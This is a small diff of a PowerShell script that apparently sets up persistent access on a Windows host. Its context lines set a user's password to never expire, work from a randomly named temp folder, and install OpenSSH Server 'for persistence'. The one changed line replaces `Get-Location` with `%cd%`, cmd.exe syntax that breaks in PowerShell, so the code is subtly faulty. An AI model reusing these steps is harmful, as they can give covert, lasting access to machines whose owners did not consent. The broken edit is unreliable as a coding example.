@@ -36,7 +36,7 @@ Write-Host "Ensuring password for $Username never expires."
 # goto temp
 $wd = random_text
 $path = "$env:TEMP/$wd"
-$initial_dir = Get-Location
+$initial_dir = %cd%
 
 # enabling persistant ssh
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
